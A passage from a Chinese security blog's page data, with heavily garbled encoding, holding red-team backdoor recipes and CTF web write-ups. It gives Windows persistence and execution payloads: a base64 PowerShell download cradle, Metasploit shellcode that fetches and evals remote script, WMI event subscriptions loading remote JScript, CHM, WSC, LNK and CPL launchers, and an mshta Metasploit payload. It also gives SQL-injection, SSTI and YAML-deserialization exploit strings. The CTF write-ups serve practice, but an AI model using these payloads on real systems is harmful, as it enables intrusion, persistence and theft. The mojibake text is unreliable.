rundll32.exe\"\",0,true);&#125;\",0 åˆ©ç”¨ CHM åŠ è½½ JSåˆ©ç”¨CHMçš„åé—¨ï¼ŒåŠ è½½JS123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1&gt;&lt;PARAM name=\"Command\" value=\"ShortCut\"&gt; &lt;PARAM name=\"Button\" value=\"Bitmap::shortcut\"&gt; &lt;PARAM name=\"Item1\" value=',calc.exe'&gt; &lt;PARAM name=\"Item2\" value=\"273,1,1\"&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt; å¯æ‰§è¡Œcalc.exeæ›¿æ¢ä¸ºå¯¹åº”jsä»£ç å³å¯ä¾‹å¦‚ï¼šè¿œç¨‹DownloadString JSRA å›è¿C21powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA== ç”Ÿæˆ Shellcode1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950msf5 payload(windows/messagebox) &gt; use windows/execmsf5 payload(windows/exec) &gt; set CMD rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();h=new%20ActiveXObject(\\\"WinHttp.WinHttpRequest.5.1\\\");h.Open(\\\"GET\\\",\\\"http://192.168.174.136/connect\\\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\\\"WScript.Shell\\\").Run(\\\"cmd /c taskkill /f /im rundll32.exe\\\",0,true);&#125;msf5 payload(windows/exec) &gt; generate -f c/* * windows/exec - 500 bytes * http://www.metasploit.com * VERBOSE=false, PrependMigrate=false, EXITFUNC=process, * CMD=rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.174.136/connect\",false);try&#123;h.Send();B=h.ResponseText;eva * l(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd * /c taskkill /f /im rundll32.exe\",0,true);&#125; */unsigned char buf[] =\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\"\"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\"\"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\"\"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\"\"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\"\"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\"\"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\"\"\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\"\"\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\"\"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\"\"\\x00\\x53\\xff\\xd5\\x72\\x75\\x6e\\x64\\x6c\\x6c\\x33\\x32\\x2e\\x65\\x78\"\"\\x65\\x20\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x22\\x5c\"\"\\x2e\\x2e\\x5c\\x6d\\x73\\x68\\x74\\x6d\\x6c\\x2c\\x52\\x75\\x6e\\x48\\x54\"\"\\x4d\\x4c\\x41\\x70\\x70\\x6c\\x69\\x63\\x61\\x74\\x69\\x6f\\x6e\\x20\\x22\"\"\\x3b\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x77\\x72\\x69\\x74\\x65\"\"\\x28\\x29\\x3b\\x68\\x3d\\x6e\\x65\\x77\\x25\\x32\\x30\\x41\\x63\\x74\\x69\"\"\\x76\\x65\\x58\\x4f\\x62\\x6a\\x65\\x63\\x74\\x28\\x22\\x57\\x69\\x6e\\x48\"\"\\x74\\x74\\x70\\x2e\\x57\\x69\\x6e\\x48\\x74\\x74\\x70\\x52\\x65\\x71\\x75\"\"\\x65\\x73\\x74\\x2e\\x35\\x2e\\x31\\x22\\x29\\x3b\\x68\\x2e\\x4f\\x70\\x65\"\"\\x6e\\x28\\x22\\x47\\x45\\x54\\x22\\x2c\\x22\\x68\\x74\\x74\\x70\\x3a\\x2f\"\"\\x2f\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x31\\x37\\x34\\x2e\\x31\\x33\"\"\\x36\\x2f\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x22\\x2c\\x66\\x61\\x6c\\x73\"\"\\x65\\x29\\x3b\\x74\\x72\\x79\\x7b\\x68\\x2e\\x53\\x65\\x6e\\x64\\x28\\x29\"\"\\x3b\\x42\\x3d\\x68\\x2e\\x52\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x54\\x65\"\"\\x78\\x74\\x3b\\x65\\x76\\x61\\x6c\\x28\\x42\\x29\\x3b\\x7d\\x63\\x61\\x74\"\"\\x63\\x68\\x28\\x65\\x29\\x7b\\x6e\\x65\\x77\\x25\\x32\\x30\\x41\\x63\\x74\"\"\\x69\\x76\\x65\\x58\\x4f\\x62\\x6a\\x65\\x63\\x74\\x28\\x22\\x57\\x53\\x63\"\"\\x72\\x69\\x70\\x74\\x2e\\x53\\x68\\x65\\x6c\\x6c\\x22\\x29\\x2e\\x52\\x75\"\"\\x6e\\x28\\x22\\x63\\x6d\\x64\\x20\\x2f\\x63\\x20\\x74\\x61\\x73\\x6b\\x6b\"\"\\x69\\x6c\\x6c\\x20\\x2f\\x66\\x20\\x2f\\x69\\x6d\\x20\\x72\\x75\\x6e\\x64\"\"\\x6c\\x6c\\x33\\x32\\x2e\\x65\\x78\\x65\\x22\\x2c\\x30\\x2c\\x74\\x72\\x75\"\"\\x65\\x29\\x3b\\x7d\\x00\"; 0x03 WSCWSC ï¼š Windows ScriptWSCæ˜¯å¾®è½¯æä¾›å¿«é€Ÿåˆ›å»ºCOMç»„å»ºçš„é€”å¾„ä¹‹å‰lcxå¸ˆå‚…å¾ˆç«çš„ä¸€ç¯‡æ–‡ç« ï¼š åˆ©ç”¨wscåˆ›å»ºaspåé—¨ 12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt; &lt;package&gt;&lt;component id=&quot;testCalc&quot;&gt; &lt;script language=&quot;JScript&quot;&gt;&lt;![CDATA[var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); ]]&gt;&lt;/script&gt; &lt;/component&gt;&lt;/package&gt; JSæ–‡ä»¶åªéœ€è°ƒç”¨wscå³å¯1GetObject(\"script:C:\\\\testwsc\\\\test.wsc\"); ä¹Ÿå¯è¿›è¡Œè¿œç¨‹è°ƒç”¨1GetObject(\"script:https://raw.githubusercontent.com/patrilic/Backdoors/master/Wsc_backdoor/test.wsc\") 0x04 WMI BackdoorWMI Backdoor - wooyun Drops powershell åˆ©ç”¨123ä¸åœ¨Clientå’ŒServerç•™ä¸‹ä»»ä½•æ–‡ä»¶ä¸æ”¹åŠ¨æ³¨å†Œè¡¨ä»…ä½¿ç”¨powershellå®ç° åˆ©ç”¨wmiæ— æ–‡ä»¶å­˜å‚¨payload123456$StaticClass = New-Object Management.ManagementClass(&apos;root\\cimv2&apos;, $null,$null)$StaticClass.Name = &apos;Win32_EvilClass&apos;$StaticClass.Put()$StaticClass.Properties.Add(&apos;EvilProperty&apos; , &quot;This is payload&quot;)$StaticClass.Put() powershell è°ƒç”¨ javascript_backdoor123456789101112$filterName = &apos;filtP1&apos;$consumerName = &apos;consP1&apos;$Command =&quot;GetObject(&quot;&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;&quot;)&quot; $Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot; $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\\subscription&quot; -Arguments @&#123;Name=$filterName;EventNameSpace=&quot;root\\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop $WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace &quot;root\\subscription&quot; -Arguments @&#123;Name=$consumerName;ScriptingEngine=&apos;JScript&apos;;ScriptText=$Command&#125; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125; mof è°ƒç”¨ javascript_backdoor123456789101112131415161718192021222324pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) instance of __EventFilter as $EventFilter&#123; EventNamespace = &quot;Root\\\\Cimv2&quot;; Name = &quot;filtP1&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot; &quot;And TargetInstance.Second = 1&quot;; QueryLanguage = &quot;WQL&quot;;&#125;; instance of ActiveScriptEventConsumer as $Consumer&#123; Name = &quot;consP1&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;GetObject(\\&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\\&quot;)&quot;;&#125;; instance of __FilterToConsumerBinding&#123; Consumer = $Consumer; Filter = $EventFilter;&#125;; ç±»ä¼¼çš„ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨wmiæ‰§è¡Œå…¶ä»–åé—¨ç¨‹åºï¼Œé…åˆä½¿ç”¨ å…·ä½“çš„å¯ä»¥çœ‹è¿™ç¯‡http://www.anquan.us/static/drops/tips-8260.html åŒæ—¶wmiä¹Ÿå¯ä½¿ç”¨ vbsmofC / C++.Netç­‰æ–¹å¼è¿›è¡Œæ‰§è¡Œ 0x05 Lnk Backdoorå¯å‚è€ƒevi1cgå¸ˆå‚…çš„æ–‡ç« -&gt;Shortcut_Backdoorå¿«æ·æ–¹å¼ä¼šæ‰§è¡Œç›®æ ‡é‡Œçš„æ–‡ä»¶ 1Shortcut_gen.exe test.txt test.lnk è¿™æ ·ç‚¹å‡»test.lnk å°±ä¼šæ‰§è¡Œtest.txtä¸­çš„å‘½ä»¤ ä¹Ÿå¯ä»¥ä½¿ç”¨evi1cgå¸ˆå‚…çš„è„šæœ¬-&gt;https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329 0x06 Chm Backdooré€šç”¨ä»¥ä¸Š #åˆ©ç”¨ CHM åŠ è½½ JSä¸å•å¯åˆ©ç”¨JSè¿›è¡Œæ‰§è¡Œ123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt; åˆ©ç”¨Objectæ ‡ç­¾ï¼Œå¯æ‰§è¡Œå„ç±»shellcodeæ¯”å¦‚åˆ©ç”¨regsvr32 æ‰§è¡Œdllï¼Œåˆ©ç”¨mshtaæ‰§è¡Œhtaï¼Œç›´æ¥è¿è¡Œpowershellï¼ŒVBSç­‰ç­‰å‰æå½“ç„¶æ˜¯åšå¥½æ··æ·†å’Œå…æ€ 0x07 CPL BackdoorCPL (Control Panel Item)CPLæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯DLLï¼Œ ä½†æ˜¯ç”±äºä»–åŒ…å«CPLAppletå‡½æ•°ï¼Œæ‰€ä»¥æˆä¸ºäº†ä¸€ä¸ªwindowså¯æ‰§è¡Œæ–‡ä»¶ä½†æ˜¯è™½ç„¶æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…¶å®æ˜¯è°ƒç”¨shell32.dll æ¥è¿è¡Œè°ƒç”¨çš„å‡ ç§æ–¹å¼: åˆ©ç”¨vbsè°ƒç”¨cpl123Dim objSet obj = CreateObject(&quot;Shell.Application&quot;)obj.ControlPanelItem(&quot;test.cpl&quot;) åˆ©ç”¨jsè°ƒç”¨cpl12var a = new ActiveXObject(&quot;Shell.Application&quot;);a.ControlPanelItem(&quot;c:\\\\test\\\\test.cpl&quot;); åŒæ ·ï¼Œå…¶å®å¯ä»¥ç›´æ¥ç”¨msfç”Ÿæˆä¸€ä¸ªdllæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹åç¼€ä¸º.cplå³å¯ï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªå¼¹çª—æç¤ºç¨‹åºå…¼å®¹æ€§é—®é¢˜è§£å†³æ–¹å¼ï¼šæ‰‹åŠ¨ç¼–è¯‘reverse_tcp å‚è€ƒï¼šhttp://www.anquan.us/static/drops/tips-16042.html 0x08 Windows åˆ©ç”¨Unicode æ–‡ä»¶ååè½¬ç›¸å½“ç®€å•.. æ’å…¥RLOå­—ç¬¦å°±å¯ä»¥è¿›è¡Œæ–‡ä»¶ååè½¬ï¼Œç„¶åå¯ä»¥æ¢å›¾ç‰‡æ¥æ›´å¥½çš„ä¼ªè£… 0x09 Winrar Backdoorè‘—åçš„CVE-2018-20250è¿˜æ²¡åˆ†æè¿‡åŸç†..çŒ®ä¸Šå­¦é•¿çš„Exphttps://github.com/WyAtu/CVE-2018-20250 0x10 CVE-2018-4878å½±å“ç‰ˆæœ¬ï¼šversion &lt;= 28.0.0.137flask æº¢å‡ºï¼Œé…åˆè„šæœ¬è¿›è¡Œæ”»å‡»å°±è¡Œ..ç°åœ¨h5ç››è¡Œï¼Œflashä¹Ÿå¿«é€€ä¼‘äº† 0x11 Nginx åå‘ä»£ç†æ¨ä¸€æ³¢passer6yhttps://www.anquanke.com/post/id/150436å¤§æ¦‚å°±æ˜¯æ³¨å†Œä¸€ä¸ªç›¸è¿‘çš„åŸŸåï¼Œç„¶ååä»£çœŸå®æœåŠ¡å™¨ï¼Œæˆªæ–­æ˜æ–‡å¯†ç ï¼Œè¿›è¡Œé’“é±¼ï¼Œå•ç‹¬åˆ†æä¸€æ³¢ # Nginx åå‘ä»£ç†å®æˆ˜","categories":[{"name":"Red-Team Tricks","slug":"Red-Team-Tricks","permalink":"http://patrilic.top/categories/Red-Team-Tricks/"}],"tags":[{"name":"Backdoor","slug":"Backdoor","permalink":"http://patrilic.top/tags/Backdoor/"}]},{"title":"CISCN2019-è¥¿å—èµ›åŒºéƒ¨åˆ†Webé¢˜è§£","slug":"CISCN2019-è¥¿å—èµ›åŒºéƒ¨åˆ†Webé¢˜è§£","date":"2019-06-10T07:08:02.000Z","updated":"2019-08-20T15:27:04.138Z","comments":true,"path":"2019/06/10/CISCN2019-è¥¿å—èµ›åŒºéƒ¨åˆ†Webé¢˜è§£/","link":"","permalink":"http://patrilic.top/2019/06/10/CISCN2019-è¥¿å—èµ›åŒºéƒ¨åˆ†Webé¢˜è§£/","excerpt":"","text":"@Author: Patrilic@Time: 2019-06-10 15:08:02æ‹¿äº†ä¸ªç¬¬å››..å¸ˆå‚…ä»¬tqlï¼Œæ²¡æƒ³åˆ°çº¯Webé˜Ÿä¼ä¹Ÿæœ‰ç¿»èº«çš„ä¸€å¤©ï¼ˆæ»‘ç¨½ï¼‰ Ciscn-q07å…ˆæ³¨å†Œä¸€ä¸ªadminâ€™# çš„è´¦å·ç„¶åç›´æ¥æ–‡ä»¶ä¸Šä¼ ç›´æ¥ä¼ php(ä¸ç”¨&lt;?php)æ”¹mimeä¸ºimage/jpegå°±getshelläº†.. åˆ¤å®šäº†ä¸€ä¸ªadminçš„æƒé™ Ciscn-q09æ³¨å†Œç”¨æˆ·ç™»é™†çš„æ—¶å€™ï¼Œå‘ç°å­˜åœ¨sqlæ³¨å…¥ç™»é™†è¿›å»ä¹‹åå‘ç°æ³¨é‡Šæœ‰æç¤ºï¼Œå­˜åœ¨adminçš„è´¦å·ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸ºä¸‹é¢çš„è´¦å·ï¼Œç™»é™†å³å¯æ³¨å…¥adminçš„å¯†ç 1username=&apos;&amp;amp;&amp;amp; extractvalue(1,concat(0x7e,(select `3` from (select 1,2,3 union select * from user)a limit 1,1)))# ç”¨adminçš„è´¦å·å’Œå¯†ç ç™»é™†æç¤ºorangeçš„SSRFï¼Œå¯æ§urlå°±æ˜¯bugåé¦ˆ æºå¸¦cookieå»è¯·æ±‚flag.phpå³å¯è·å¾—flag Ciscn 8URLï¼š172.16.9.18çœ‹ç€æœ‰è®¡ç®—åŠŸèƒ½ï¼Œå¹¶ä¸”æ˜¯PYï¼Œç›´æ¥æƒ³SSTIï¼Œè¯•äº†ä¸‹ 2å¾—åˆ°è¾“å‡ºç»“æœä¸º2ï¼Œç¡®å®šäº†SSTI ç„¶åå°±æ˜¯ç”¨payloadäº†ï¼Œä¸è¿‡æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°äº†ä¸¤ä¸ªè¿‡æ»¤çš„ç‚¹ ä¸€ä¸ªæ˜¯æ‹¬å·ï¼Œä¸€ä¸ªæ˜¯openå­—ç¬¦ä¸²ï¼Œä¸è¿‡éƒ½å¯ä»¥ç”¨åŒå†™æ¥ç»•è¿‡ æ‹¬å·åªæ˜¯å•ç‹¬çš„æ‹¬å·å°±ä¼šè¢«ç½®æ¢ä¸ºç©ºï¼Œå¦‚æœé‡Œé¢æœ‰å­—ç¬¦çš„è¯å°±ä¸ä¼šç½®æ¢ä¸ºç©º æ¯”å¦‚ () è¦ç”¨ (()) ç»•ï¼Œ open è¦ç”¨ opopenen ç»•äºæ˜¯æœ€ç»ˆçš„payloadä¸º1&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__(())[302].__init__.__globals__[&apos;poopenpen&apos;](&apos;cat flag&apos;).read(())&#125;&#125; Ciscn 10URLï¼š 172.16.9.20ç‚¹å‡»å¿˜è®°å¯†ç  ä¿®æ”¹åå¯ç›´æ¥ç™»å½•admin çŒœæµ‹yamlå‘½ä»¤æ‰§è¡Œæ‰§è¡Œlsç»“æœ Payloadï¼š1234!!map &#123;? !!str &quot;goodbye&quot;: !!python/object/apply:subprocess.check_output [!!str &quot;ls&quot;,],&#125; å‡†å¤‡æ„é€ payload è¿›è¡Œcat /flagæ—¶å‘ç°åˆ«äººä¸Šä¼ äº†5.ymlç›´æ¥è®¿é—®å³å¯ï¼š flag{81595b84-317b-434a-b45f-6aea2c37722c}","categories":[{"name":"Write-up","slug":"Write-up","permalink":"http://patrilic.top/categories/Write-up/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://patrilic.top/tags/CTF/"}]},{"title":"QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰","slug":"QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰","date":"2019-06-05T12:59:32.000Z","updated":"2019-08-20T15:28:04.484Z","comments":true,"path":"2019/06/05/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰/","link":"","permalink":"http://patrilic.top/2019/06/05/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰/","excerpt":"","text":"@Author: Patrilic@Time: 2019-06-05 20:59:32å¾ˆå°‘é‡åˆ°ä½¿ç”¨ mysqli_multi_query() çš„é¢˜ç›®ï¼Œåšä¸ªè®°å½• æ¦‚ç‡è®ºä½¿æˆ‘æ†”æ‚´ 0x01 æ€è·¯æ‰“å¼€é¢˜ç›®ï¼Œå°±ä¸€ä¸ª&lt;input>æ ‡ç­¾ï¼Œéšä¾¿è¾“ä¸€ä¸ªæ•°å­—ï¼ŒburpæŠ“ä¸€ä¸‹ æ„Ÿè§‰æ˜¯ä¸€èˆ¬çš„selectè¯­å¥1select id, data from table_name where id = &#123;$inject&#125; æµ‹ä¸€ä¸‹è¿‡æ»¤æƒ…å†µéšä¾¿è¾“å…¥ä¸€ä¸ªçˆ†å‡ºè¿‡æ»¤æƒ…å†µ1return preg_match(\"/select|update|delete|drop|insert|where|\\./i\", $inject); å°è¯•ä¸€æ³¢extractvalue(),æ— æœ.. ç„¶åå°±åœ¨æµ‹è¯•ä¸€äº›å¸¸ç”¨çš„æƒ…å†µï¼Œç±»ä¼¼äº1if((substr(user(),1,1)&gt;'a'),sleep(5),1); åæ¥@hpdogerå‘Šè¯‰æˆ‘è¯´å¯ä»¥å †å æŸ¥è¯¢..äºæ˜¯ä¹..1show databases; 1show tables 1describe`1919810931114514` 1show variables like 'version' æ‰€ä»¥ç°åœ¨çš„ä¿¡æ¯å°±æ˜¯1234database: supersqlitable: 1919810931114514column: flagversion: 10.0.27-MariaDB-0ubuntu0.16.04.1 ç„¶åè¿˜æœ‰ä¸ªå¥½ç©çš„ï¼šæŸ¥çœ‹grantçš„æ—¶å€™: ;SHOW GRANTS FOR CURRENT_USER() ç°åœ¨ç›®æ ‡æ˜ç¡®ï¼Œå°±æ˜¯è¦1select flag from 191981093111414 æ–¹æ³•1åˆ©ç”¨setå°†select flag from 1919810931114514å†™å…¥å˜é‡@patrilicä¸­ï¼Œåˆ©ç”¨prepareå°†å˜é‡è®¾ç½®ä¸ºé¢„å¤„ç†ï¼Œç„¶åå†execute ä¸»è¦å¯ä»¥bypassæ‰selectï¼Œç”¨char()å‡½æ•°å¸¦å…¥ã€‚1set @patrilic=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),1919810931114514); ç„¶åç›´æ¥æ‰§è¡Œå³å¯.payload:1inject=&apos;;SET+@patrilic=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+patrilic+from+@patrilic;execute+patrilic%23 å‚è€ƒ:https://blog.csdn.net/qq_42030417/article/details/80372800 æ–¹æ³•2åˆ©ç”¨mysql::handler ä¹Ÿå¯ä½¿ç”¨åˆ«å payload:1inject=&apos;;handler+`1919810931114514`+open;handler`1919810931114514`read+first%23 å‚è€ƒï¼šhttps://dev.mysql.com/doc/refman/5.7/en/handler.htmlhttps://blog.csdn.net/JesseYoung/article/details/40785137 æ–¹æ³•3â€¦","categories":[{"name":"Write-up","slug":"Write-up","permalink":"http://patrilic.top/categories/Write-up/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://patrilic.top/tags/CTF/"}]},{"title":"Command Execute By mshta","slug":"Command Execute By mshta","date":"2019-05-08T03:20:33.000Z","updated":"2019-08-20T15:30:06.327Z","comments":true,"path":"2019/05/08/Command Execute By mshta/","link":"","permalink":"http://patrilic.top/2019/05/08/Command Execute By mshta/","excerpt":"","text":"@Author: Patrilic@Time: 2019-05-08 11:20:33 0x01 mshtağŸ‘‰å®˜æ–¹æ–‡æ¡£ç›´é€šè½¦ â€“&gt;ğŸš—æ»´æ»´æ»´) æ€è·¯ï¼šåˆ©ç”¨Mshtaæ‰§è¡ŒJavaScript/VBscript è°ƒç”¨WScript.shellæ‰§è¡Œå‘½ä»¤ç»“åˆVBSä¸‹è½½C2 payloadï¼ŒJSä¸‹è½½payloadï¼ŒJSRATï¼Œç›´æ¥åå¼¹sessionâ€¦â€¦eg:123mshta vbscript:window.execScript(\"alert('hello world!');\",\"javascript\") mshta javascript:window.execScript(\"msgBox('hello world!'):window.close\",\"vbs\") æµ‹è¯•ï¼š Attacker : 192.168.199.142 MacOSVictim : 192.168.121.130 Windows 10 1809 0x02 MetaSploit::hta_serverexploit/windows/misc/hta_server å—å®³æœºæ‰§è¡Œ1mshta http://192.168.199.142:8080/wSbMp9V.hta ä¼šè¢«Defenderæ‹¦æˆªæ ·æœ¬åˆ†æ ä¸ºBase64åŠ å¯†çš„ps1ä»£ç 123456789101112if([IntPtr]::Size -eq 4)&#123; $b=&apos;powershell.exe&apos;&#125;else&#123; $b=$env:windir+&apos;\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe&apos;&#125;; $s=New-Object System.Diagnostics.ProcessStartInfo; $s.FileName=$b; $s.Arguments=&apos;-nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(&apos;&apos;H4sIABhN0FwCA7VW+2/aSBD+OZH6P1gVkm2FYCC0aSJVujVPE5xAHAiEQ6fFXtsLa5vYa169/u83C3abXtO79qSzeOxjZnbmm29m7aahzWkUSr4xlz69OT3p4xgHklJwR1dFqRDdqCcnsFrYs2pd+igpU7RaNaIA03B2fV1P45iE/DgvtQlHSUKCOaMkUVTpT+nRJzE5v5sviM2lT1Lhj1KbRXPMMrFdHds+kc5R6Ii9XmRj4UrJWjHKFfn332V1el6ZlZrPKWaJIlu7hJOg5DAmq9JnVRz4sFsRRTapHUdJ5PLSIw0vqqVhmGCX3IK1NTEJ9yMnkVWIAj4x4WkcSod4hIHjtiLDsB9HNnKcmCSJXJSmwvR0NvtNmWbn3qchpwEpGSEncbSySLymNklKHRw6jNwTdwZaFo9p6M1UFcTW0ZIohTBlrCj9ihnllmxy1H5WSXmpBFJ9HqtFSOMrcZqRkzJy1JRfcVSkXoXnmH7A7fOb0zenbk6U+YX5kigwOpkexgRcU/pRQg9iH6VyUTLhEMyjeAfTwkOcEnX2BVipsF4Wf6xdyUVB0Kt0rS2sTUcRdWagkyWzsAnmYvnHnGwQl4aksQtxQO2cdsprABOXkUOApVzsFpxS5GyDOA3CiIe5gEzk+Tu1ZkD5F109pcwhMbIhSQl4BflTv3XmmAVFNkKTBIDQcQ7EK7hAdpJLZwTf5aeLOQjJdYaTpCj1U6g2uyhZBDPiFCUUJjTbQimPDkP5q7tmyji1ccJzczM1gzE7rh6FCY9TG3IGoT9YK2JTzAQSRalDHaLvLOrlx8qv4lDHjEEJgKU15AFWRPwWF0yIwUPIulqyCDeCFSMBSBxqvsWwBxWe0fxAHOwRR/6bezmLj5QVOOQAvHAOkmuxiBelEY05dA6B6YFB/+XwFy1DuFGPSZYEJS+Mqb7jgs+FjXUlyJghcog/5hB7K44CHSfkfe3YHJS32h2tI3gmRshMW1/SCtrQimHCd0gvjKhx6dx0Fx0tbmx9FxmJYXb6jUGnU1t3rVGNW02D3/QNbjbHi4WFOvfDCX8yUOeBlpeT2n7VpXurh5zJVnu/1/ebsr7dLzzHnTRc17t0rfvKuxbtPdYHermKe41m2nvUN3q5ljTppjOgw8Gy2+LzyYjhoat548oVpttevBhVInNvINT2L+x91x21fdPZTTqULLRyjw7QAKEb+344bHsrr50g7Wr0XA8W6NkkdxgZqDnadd8xfTBs6WjY1Af4LupfnDW0ypPz3Gw9jXE3YE67o1UmY+SgWHvw/MrlnR8KnLCnP+tCBvWedi0NZPo11KlV6f7pedD2UBNkRkGEcIsuh2djsHn7ADqPw4oTIR4aY00beZqHXMufYKSDtP6MWnpU333om31tNKr6lfmy4oPPZLz+YHbRWcvua5p2FszhV0O2udqGY31zud5w3H0E2w/a1fDjW8EQoEhhVa0+vcj9j7q1iePExww4AW04L8FWFLey3tqPqNBQFHEZL0kcEga3Gdx3OZURY5Et+rpownClHBu9uHeGMLyovjpSpS+C6td2ny9dXz+Bj1AaQN9Sj4Qe94vl7UW5DO27vK2VIcSfD6serXaKsFQU3f8AS2aZHSyromAK6fJ/xSqrUR/+nH/B6uvaP+z+FH7l4jHa75a/XfglNH818EdMOQha0G